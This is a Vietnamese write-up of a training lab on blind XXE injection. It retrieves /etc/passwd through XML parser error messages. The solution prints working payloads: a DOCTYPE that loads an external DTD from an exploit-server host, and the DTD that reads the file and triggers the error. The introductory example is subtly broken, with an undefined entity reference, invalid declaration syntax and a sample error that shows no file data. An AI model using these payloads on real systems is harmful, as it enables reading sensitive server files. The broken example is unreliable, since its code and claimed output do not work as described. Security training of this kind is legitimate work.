# Lab: Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

# Overview:

Khai thác blind XXE để lấy dữ liệu thông qua các thông báo lỗi, trong đó kẻ tấn công có thể kích hoạt một thông báo lỗi phân tích chứa dữ liệu nhạy cảm.

Khai thác blind XXE để lấy dữ liệu là khi kẻ tấn công tạo ra một lỗi phân tích XML, và thông báo lỗi này chứa dữ liệu nhạy cảm mà kẻ tấn công muốn lấy. Thông báo lỗi này được trả về từ ứng dụng và chứa dữ liệu mục tiêu.

Ví dụ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % error ENTITY "%x;">
  %error;
]>
```

Trong trường hợp này, yêu cầu XML chứa một thực thể %xxe với giá trị là nội dung của tệp /etc/passwd. Sau đó, nó tạo ra một thực thể %error tham chiếu đến %xxe và chèn %error vào tài liệu XML.

Nếu ứng dụng web bị lỗ hổng blind XXE và xử lý yêu cầu XML này, nó sẽ phản hồi với một thông báo lỗi. Ví dụ, nếu tệp /etc/passwd được đọc thành công, ứng dụng có thể trả về một thông báo lỗi như sau:

```xml
Internal Server Error: Failed to process XML. Entity reference "&#x25;xxe;" not found.
```

Trong thông báo lỗi này, bạn có thể thấy rằng thông báo chứa một phần của nội dung tệp /etc/passwd, do đó, cho phép bạn thu thập thông tin nhạy cảm như tài khoản người dùng trên hệ thống.

Form của challenge khá tương tự như lab lần trước.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/b657d57e-74c5-45ca-a0a9-75fecf95d9c4)

Cách làm thì khá tương tự lab DTD nhưng thay vì là `file:///etc/hostname` thì ta sẽ thay đổi `/etc/passwd`. Ta sẽ tham chiếu multi-line file password và khi ta trích xuất dữ liệu bằng cách cũ.

# Solution:

Vậy thì cách chính làm bài này là sử dụng error messages, khi ứng dụng trả lại lỗi messages có liên quan tới xml parsing ta có thể dùng nó để trigger error messages cũng như là dữ liệu mà ta muốn trích xuất.

Đầu tiên thì ta check stock rồi chèn payload cũ vào thôi

```xml
<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "https://exploit-0a3f0047049470af847ae19e01ce0034.exploit-server.net/exploit">
%loadDtd;
%stack;
%error;]>
```

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/c778044a-2a7a-4855-bc3b-6c896a3a5e07)

```xml
<!ENTITY % file  SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; error SYSTEM  'file:///idonotexist/%file;'>">
```
Thay vì ta gửi content của cái `file` entity này cho exploit server, ta sẽ trigger lỗi. Ta có `error entity` tham chiếu cho một cái nguồn không tồn tại, mình đặt tên là `idonotexist` sau đó là `/%file` cho file ta muốn trích xuất.

Mình đặt random cái file là `idonotexist` là bởi vì khi xml parser sẽ xem xét `error entity` và sẽ lấy resources không tồn tại ở dây là `idonotexist` và nó sẽ trả về lỗi bới vì nó ko tìm được cái file nào tên như vậy.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/e01548a5-a379-4758-924d-2f369624f1ca)

Sau đó lưu và send request 

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/3f402ced-153b-471d-bf58-a5d72725c8b4)

Ta đã solve được lab.
